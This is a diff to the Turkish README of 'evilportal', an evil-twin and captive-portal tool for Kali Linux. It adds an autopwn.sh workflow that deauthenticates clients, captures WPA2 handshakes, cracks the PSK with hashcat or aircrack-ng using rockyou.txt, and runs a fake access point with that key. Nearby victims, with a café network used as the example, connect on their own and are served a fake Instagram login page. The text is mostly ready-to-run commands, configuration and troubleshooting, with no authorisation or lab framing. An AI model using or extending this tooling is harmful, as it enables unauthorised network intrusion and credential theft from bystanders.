@@ -17,6 +17,7 @@ Kali Linux üzerinde çalışan evil-twin + captive-portal sistemi:
 | `aircrack-ng` | `apt install aircrack-ng` |
 | `ipset`, `iptables` | genelde kurulu |
 | `flask` | `sudo apt install python3-flask` (veya `pip3 install flask --break-system-packages`) |
+| `hashcat` + `hcxtools` | opsiyonel — varsa kırma hızlanır |
 
 ---
 
@@ -26,16 +27,17 @@ Kali Linux üzerinde çalışan evil-twin + captive-portal sistemi:
 
 ```bash
 cd evilportal
-chmod +x setup.sh deauth.sh scan.sh
+chmod +x setup.sh deauth.sh scan.sh autopwn.sh
 sudo python3 gui.py
 ```
 
 Tarayıcıda `http://127.0.0.1:8099` aç:
 
 1. **Arayüz** — monitor kartı, AP kartı, uplink
-2. **Hedef** — SSID, BSSID, kanal, WPA parolası, portal sayfası
-3. **Başlat** — canlı log, başlat/durdur
-4. **Kayıtlar** — yakalanan bilgiler, otomatik yenilenir
+2. **Hedef** — “Tara” ile ağları listele, seç; SSID/BSSID/kanal otomatik dolar
+3. **Kır** — WPA2 ise handshake yakala + wordlist ile kır, PSK otomatik dolar
+4. **Başlat** — canlı log, başlat/durdur
+5. **Kayıtlar** — yakalanan bilgiler, otomatik yenilenir
 
 “Portalı önizle” butonu seçili sahte sayfayı yeni sekmede gösterir.
 
@@ -52,15 +54,19 @@ http://127.0.0.1:8099
 
 ```bash
 cd evilportal
-chmod +x setup.sh deauth.sh scan.sh
+chmod +x setup.sh deauth.sh scan.sh autopwn.sh
 
 # 1) Hedefi bul
 sudo ./scan.sh wlan0
 #    Çıktıdaki BSSID / CH / ESSID değerlerini not al
 
+# 1b) WPA2 ise handshake yakala ve kır (PSK'yi capture/psk.txt'e yazar)
+sudo ./autopwn.sh AA:BB:CC:DD:EE:FF 6 KafeWiFi
+#    çıkan PSK'yi config.sh'de WPA_PASS'e yaz
+
 # 2) config.sh'i düzenle
 nano config.sh
-#    TARGET_SSID, TARGET_BSSID, CHANNEL, MON_IF, AP_IF
+#    TARGET_SSID, TARGET_BSSID, CHANNEL, WPA_PASS, MON_IF, AP_IF
 
 # 3) Çalıştır
 sudo ./setup.sh
@@ -100,6 +106,10 @@ SHARE_INTERNET=1
 PORTAL_TEMPLATE="instagram"   # instagram | verify
 BRAND="Hesap Güvenliği Merkezi"
 SUCCESS_URL="https://www.google.com"
+
+# --- Handshake kırma ---
+WORDLIST="/usr/share/wordlists/rockyou.txt"
+CAPTURE_TIMEOUT="60"
 ```
 
 ---
@@ -108,14 +118,58 @@ SUCCESS_URL="https://www.google.com"
 
 Bu, sistemin çalışıp çalışmayacağını belirleyen tek şey:
 
-| Hedef ağ | `WPA_PASS` | Sonuç |
+| Hedef ağ | Yöntem | Sonuç |
 |---|---|---|
-| **Açık (open)** | boş | İstemciler otomatik bağlanır ✅ |
-| **WPA2-PSK, parolayı biliyorsun** | parola | İstemciler otomatik bağlanır ✅ |
-| **WPA2-PSK, parolayı bilmiyorsun** | boş | İstemci güvenlik uyuşmazlığı yüzünden **bağlanmaz** ❌ |
-| **WPA3 / 802.1X** | — | Deauth PMF ile engellenir, twin bağlanmaz ❌ |
+| **Açık (open)** | `WPA_PASS` boş | İstemciler otomatik bağlanır ✅ |
+| **WPA2-PSK, parola biliniyor** | `WPA_PASS` dolu | İstemciler otomatik bağlanır ✅ |
+| **WPA2-PSK, parola bilinmiyor** | 3. adım: handshake kır | Wordlist bulursa ✅, bulamazsa ❌ |
+| **WPA3 / 802.1X** | — | Deauth PMF ile engellenir ❌ |
 
-Yani bir kafe ağının parolasını bilmiyorsan ya o ağ açıktır (çoğu kafe böyledir) ya da bu teknik çalışmaz. WPA2-PSK hedefte parola bilinmeden twin'e bağlanma olmaz — çünkü istemci kayıtlı profiliyle 4-way handshake bekler, sen PSK'ya sahip olmadığın için tamamlayamaz.
+Kritik nokta: WPA2 hedefte sahte AP'nin istemcileri **otomatik** çekmesi için gerçek
+PSK'yi bilmek zorundasın. İstemci kayıtlı profiliyle 4-way handshake bekler; sen PSK'ya
+sahip değilsen handshake tamamlanmaz ve cihaz bağlanmaz. Bu yüzden `autopwn.sh` var:
+handshake'i yakalar, wordlist ile kırar, çıkan parolayı sahte AP'ye yazar.
+
+---
+
+## Handshake kırma — `autopwn.sh`
+
+Fluxion tarzı akışın otomatik hali:
+
+```
+monitor mode + kanal kilidi
+        ↓
+airodump-ng (hedef BSSID, pcap)  +  aireplay-ng deauth döngüsü
+        ↓
+4-way handshake yakalanana kadar bekle (CAPTURE_TIMEOUT)
+        ↓
+hashcat -m 22000 (hcxtools varsa)  →  yoksa  aircrack-ng
+        ↓
+PSK bulundu → capture/psk.txt → GUI'de WPA_PASS alanına yazılır
+        ↓
+4. adımda sahte AP bu PSK ile açılır → istemciler otomatik bağlanır
+        ↓
+captive portal → Instagram sayfası
+```
+
+Terminalden:
+
+```bash
+sudo ./autopwn.sh
+# veya
+sudo ./autopwn.sh AA:BB:CC:DD:EE:FF 6 KafeWiFi \
+     /usr/share/wordlists/rockyou.txt wlan0 90
+```
+
+Sınırlar:
+
+- **Wordlist'e bağlı.** rockyou.txt zayıf/standart parolaları kırar; güçlü PSK kırılmaz.
+- Kali'de rockyou sıkıştırılmış gelir: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`
+- aircrack-ng CPU'da yavaştır (birkaç bin anahtar/sn). rockyou tam tarama saatler
+  sürebilir — önce küçük/özel liste dene, GPU varsa hashcat kullan.
+- **Handshake için hedefe bağlı aktif bir istemci gerekir.** Kimse bağlı değilse
+  deauth handshake üretmez.
+- WPA3-SAE kırılamaz; 802.11w PMF deauth'u engeller ama pasif handshake yakalanabilir.
 
 ---
 
@@ -194,6 +248,9 @@ python3 show.py -f       # canlı takip
 | `hostapd başlatılamadı` | Adaptör AP mode desteklemiyor veya `AP_IF` yanlış. `logs/hostapd.log` |
 | Portal açılmıyor | `dnsmasq` çalışıyor mu, `iptables -t nat -L -n -v` |
 | İstemci bağlanmıyor | Hedef WPA2 ve `WPA_PASS` boş — yukarıdaki tablo |
+| Handshake yakalanmıyor | Hedefe bağlı istemci yok, kanal yanlış, ya da PMF aktif |
+| PSK bulunamadı | Wordlist yetersiz; daha büyük liste veya hashcat+GPU |
+| Wordlist okunamıyor | `gunzip /usr/share/wordlists/rockyou.txt.gz` |
 | Deauth işe yaramıyor | 802.11w (PMF) aktif, ya da yanlış kanal/BSSID |
 | Tek adaptörde AP düşüyor | Yongaset uyumsuz — ikinci adaptör kullan |
 | İnternet gelmiyor | `UPLINK_IF` yanlış veya `ip_forward` kapalı |
@@ -208,6 +265,7 @@ evilportal/
 ├── config.sh                 # tüm ayarlar
 ├── setup.sh                  # ana orkestrasyon
 ├── gui.py                    # adım adım yerel web GUI (127.0.0.1:8099)
+├── autopwn.sh                # handshake yakala + kır (PSK)
 ├── deauth.sh                 # sürekli deauth döngüsü
 ├── scan.sh                   # hedef keşfi
 ├── show.py                   # yakalananları göster
